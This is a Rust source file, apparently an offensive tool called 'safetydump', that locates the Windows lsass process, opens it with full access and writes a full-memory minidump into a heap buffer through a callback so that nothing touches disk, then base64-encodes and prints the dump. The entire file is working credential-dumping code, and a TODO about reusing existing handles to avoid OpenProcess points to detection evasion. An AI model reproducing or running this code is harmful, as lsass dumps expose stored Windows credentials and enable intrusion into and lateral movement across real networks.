use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::DWORD_PTR,
        ntdef::{HANDLE, HRESULT},
        minwindef::{DWORD, LPVOID},
        winerror::{S_FALSE, S_OK},
    },
    um::{
        heapapi::{GetProcessHeap, HeapAlloc, HeapFree, HeapSize, HeapReAlloc},
        processthreadsapi::OpenProcess,
        psapi::{GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS},
        winnt::{HEAP_ZERO_MEMORY, RtlCopyMemory, PROCESS_ALL_ACCESS},
    },
};
use std::{
    mem::{drop, forget, MaybeUninit, size_of_val},
    slice::from_raw_parts_mut,
};
use sysinfo::{ProcessExt, System, SystemExt};

// define enums and structs
#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_CALLBACK_TYPE(pub i32);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_CALLBACK_TYPE {
    const ModuleCallback: Self = Self(0);
    const ThreadCallback: Self = Self(1);
    const ThreadExCallback: Self = Self(2);
    const IncludeThreadCallback: Self = Self(3);
    const IncludeModuleCallback: Self = Self(4);
    const MemoryCallback: Self = Self(5);
    const CancelCallback: Self = Self(6);
    const WriteKernelMinidumpCallback: Self = Self(7);
    const KernelMinidumpStatusCallback: Self = Self(8);
    const RemoveMemoryCallback: Self = Self(9);
    const IncludeVmRegionCallback: Self = Self(10);
    const IoStartCallback: Self = Self(11);
    const IoWriteAllCallback: Self = Self(12);
    const IoFinishCallback: Self = Self(13);
    const ReadMemoryFailureCallback: Self = Self(14);
    const SecondaryFlagsCallback: Self = Self(15);
    const IsProcessSnapshotCallback: Self = Self(16);
    const VmStartCallback: Self = Self(17);
    const VmQueryCallback: Self = Self(18);
    const VmPreReadCallback: Self = Self(19);
    const VmPostReadCallback: Self = Self(20);
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    status: HRESULT
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INPUT {
    process_id: i32,
    process_handle: *mut c_void,
    callback_type: MINIDUMP_CALLBACK_TYPE,
    io: MINIDUMP_IO_CALLBACK,
}

#[allow(dead_code)]
#[allow(non_snake_case)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INFORMATION<'a> {
    CallbackRoutine: *mut c_void,
    CallbackParam: &'a mut *mut c_void,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_IO_CALLBACK {
    handle: *mut c_void,
    offset: u64,
    buffer: *mut c_void,
    buffer_bytes: u32
}

#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_TYPE(pub i64);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_TYPE {
    const MiniDumpNormal: Self = Self(0);
    const MiniDumpWithDataSegs: Self = Self(1);
    const MiniDumpWithFullMemory: Self = Self(2);
    const MiniDumpWithHandleData: Self = Self(3);
    const MiniDumpFilterMemory: Self = Self(4);
    const MiniDumpScanMemory: Self = Self(5);
    const MiniDumpWithUnloadedModules: Self = Self(6);
    const MiniDumpWithIndirectlyReferencedMemory: Self = Self(7);
    const MiniDumpFilterModulePaths: Self = Self(8);
    const MiniDumpWithProcessThreadData: Self = Self(9);
    const MiniDumpWithPrivateReadWriteMemory: Self = Self(10);
    const MiniDumpWithoutOptionalData: Self = Self(11);
    const MiniDumpWithFullMemoryInfo: Self = Self(12);
    const MiniDumpWithThreadInfo: Self = Self(13);
    const MiniDumpWithCodeSegs: Self = Self(14);
    const MiniDumpWithoutAuxiliaryState: Self = Self(15);
    const MiniDumpWithFullAuxiliaryState: Self = Self(16);
    const MiniDumpWithPrivateWriteCopyMemory: Self = Self(17);
    const MiniDumpIgnoreInaccessibleMemory: Self = Self(18);
    const MiniDumpWithTokenInformation: Self = Self(19);
    const MiniDumpWithModuleHeaders: Self = Self(20);
    const MiniDumpFilterTriage: Self = Self(21);
    const MiniDumpWithAvxXStateContext: Self = Self(22);
    const MiniDumpWithIptTrace: Self = Self(23);
    const MiniDumpScanInaccessiblePartialPages: Self = Self(24);
    const MiniDumpValidTypeFlags: Self = Self(25);
}

fn main() {
    let test = vec!["safetydump", "0"];
    let buf_b64 = in_memory_dump(test);
    println!("{}", buf_b64);
}

#[allow(non_snake_case)]
pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_CALLBACK_INPUT, callbackOutput: &mut MINIDUMP_CALLBACK_OUTPUT) -> bool {
    match callbackInput.callback_type {
        MINIDUMP_CALLBACK_TYPE::IoStartCallback => { 
            callbackOutput.status = S_FALSE;
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => { 
            callbackOutput.status = S_OK;
            let read_buf_size = callbackInput.io.buffer_bytes;
            let current_buf_size = unsafe { HeapSize(
                GetProcessHeap(),
                0 as _,
                *buf
            ) };
            // check if buffer is large enough
            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
            if bytes_and_offset >= current_buf_size {
                // increase heap size
                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
                    current_buf_size*2
                } else {
                    bytes_and_offset
                };
                *buf = unsafe { HeapReAlloc(
                    GetProcessHeap(),
                    0 as _,
                    *buf,
                    size_to_increase
                )};
            }

            let source = callbackInput.io.buffer as *mut c_void;
            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
            let _ =  unsafe {
                RtlCopyMemory(
                    destination, 
                    source,
                    read_buf_size as usize
                )
            };
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoFinishCallback => { 
            callbackOutput.status = S_OK;
            return true
        },
        _ => {
            return true
        },
    }
}

pub fn in_memory_dump(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "".to_string()
    }

    // extract arguments
    let mut pid = match args[1].parse::<u32>() {
        Err(_)  => return "".to_string(),
        Ok(pid) => pid,
    };
    
    #[allow(unused_assignments)]
    let mut handle: HANDLE = 0 as _;

    if pid == 0 {
        // get lsass PID
        let s = System::new_all();
        let lsass = s.get_process_by_name("lsass");
        if lsass.len() > 0 {
            pid = lsass[0].pid() as u32;
        }
        // get lsass process handle
        // TODO get an already used HANDLE to avoid OpenProcess(), try processhacker/ProcessHacker/hndlprv.h
        handle = unsafe { OpenProcess(
            PROCESS_ALL_ACCESS,
            0x01,
            pid
        )};
    } else {
        handle = unsafe { OpenProcess(
            PROCESS_ALL_ACCESS,
            0x01,
            pid
        )};
    }
    
    if handle.is_null() {
        return "could not open PID".to_string()
    }
    
    // https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
    #[link(name = "dbghelp")]
    extern "stdcall" {
        pub fn MiniDumpWriteDump(hProcess: HANDLE, processId: DWORD, hFile: HANDLE, dumpType: u64, exceptionParam: *mut c_void, userStreamParam: *mut c_void, callbackParam: *mut MINIDUMP_CALLBACK_INFORMATION) -> bool;
    }
    
    // get lsass size and add padding
    let extra_5mb: usize = 1024*1024 * 5;
    let buf_size: usize;
    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
    let gpm_ret = unsafe { GetProcessMemoryInfo(
        handle,
        pmc.as_mut_ptr(),
        size_of_val(&pmc) as DWORD
    )};
    if gpm_ret != 0 {
        let pmc = unsafe { pmc.assume_init() };
        buf_size = pmc.WorkingSetSize + extra_5mb;
    } else {
        return "".to_string()
    }

    // alloc memory in current process
    let mut buf = unsafe { HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        buf_size
    )};
    forget(buf);

    // set up minidump callback
    let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
        CallbackRoutine: minidump_callback_routine as _,
        CallbackParam: &mut buf,
    };
    let _ = unsafe{ MiniDumpWriteDump(
        handle, 
        pid, 
        0 as _, 
        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
        0 as _, 
        0 as _, 
        &mut callback_info
    )};

    // base64
    let buf_slice: &mut [u8] = unsafe { from_raw_parts_mut(buf as _, buf_size) };
    let buf_b64 = base64::encode(buf_slice);
    
    // drop allocated memory
    let _ = unsafe { HeapFree(
        GetProcessHeap(),
        0 as _,
        buf
    )};
    drop(buf);

    return buf_b64
}
